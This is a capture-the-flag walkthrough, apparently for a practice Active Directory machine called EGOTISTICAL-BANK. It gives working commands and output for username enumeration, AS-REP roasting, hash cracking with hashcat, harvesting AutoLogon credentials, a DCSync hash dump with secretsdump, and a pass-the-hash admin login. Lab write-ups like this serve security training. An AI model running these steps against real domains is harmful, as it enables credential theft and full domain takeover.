First thing is to go to the about team page and get all the team names. Then use the following python script to generate valid usernames for the kerberoasting attack:
```python
names = ["Fergus Smith", "Shaun Coins", "Sophie Driver", "Hugo Bear", "Bowie Taylor", "Steven Kerb","Jenny Joy"]
username_variants = []

for name in names:
    first, last = name.lower().split()
    username_variants.append(first)
    username_variants.append(last)
    username_variants.append(f"{first[0]}{last}")
    username_variants.append(f"{first}.{last}")
    username_variants.append(f"{last}{first[0]}")
    username_variants.append(f"{last}.{first}")

# Remove duplicates and sort
username_variants = sorted(set(username_variants))

# Now you can save this to a file
with open("usernames.txt", "w") as f:
    for username in username_variants:
        f.write(f"{username}\n")

```

Then once you have a list of usernames. Run the following command to get the ticket:
```shell
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile usernames.txt
.
.
.
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c069f31e78de81a1a181384f340b37b3$d6023c97d3b80263e881651e9af961668ca1c505dc6da582a95fb8fa7d63764b596b5a043d75c741e6e47692e86a56b5dbbf13345d9d85c001928f233b4e822ac6f5213260b703b8155a360e755ea65dff53dd5a4c469570e8716486e168c3e217c11be99d713a25e8117266a826f7c7e5212c96b7f2afd5fea245cf9e2ef4b0fd0e8ee618bf89c9a614e0a6935166f0cd55b090634d2cad065298b6c7dc0113e2632333e9416718fe18c92406d986d87a6588b6338a052b187d0f80e04c9011b0ef31ca1e6a82047e3491385b31045b0895716bfe6ef63a7429c071c00fd57f9c23c7760248cd76c207ae57e73170a024767a5aa69136ee9338153ffde7d9e6
.
.
.
```

Crack it with hashcat:
```shell
hashcat -m 18200 ticket.txt /usr/share/wordlists/rockyou.txt  

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c069f31e78de81a1a181384f340b37b3$d6023c97d3b80263e881651e9af961668ca1c505dc6da582a95fb8fa7d63764b596b5a043d75c741e6e47692e86a56b5dbbf13345d9d85c001928f233b4e822ac6f5213260b703b8155a360e755ea65dff53dd5a4c469570e8716486e168c3e217c11be99d713a25e8117266a826f7c7e5212c96b7f2afd5fea245cf9e2ef4b0fd0e8ee618bf89c9a614e0a6935166f0cd55b090634d2cad065298b6c7dc0113e2632333e9416718fe18c92406d986d87a6588b6338a052b187d0f80e04c9011b0ef31ca1e6a82047e3491385b31045b0895716bfe6ef63a7429c071c00fd57f9c23c7760248cd76c207ae57e73170a024767a5aa69136ee9338153ffde7d9e6:Thestrokes23
                                                          
Session..........: hashcat
Status...........: Cracked

```

# User Flag
connect via winrm with the creds you just got and go to the desktop


### Running WinPeas
```shell
 Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!


```

# Dangerous Rights
The svc user has the ==GetChangesAll== right which can be used with the DCSync right to get the ntlm hashes

* Problem was it was not svc_loanmanager it mgr*
# Dumping the hashes
```shell
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
Impacket v0.12.0.dev1+20240327.181547.f8899e65 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:e5016676d601a3f963873ddc8ee99e53:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:156cacd5ed940d73f14a4c6bab720eb284bc91a86df9caaa6b0fb5f3cd65e48e
SAUNA$:aes128-cts-hmac-sha1-96:375cd621a8e93c93dff01e0663457225
SAUNA$:des-cbc-md5:104c515b86739e08

```

# Login as Admin
```shell
evil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e

```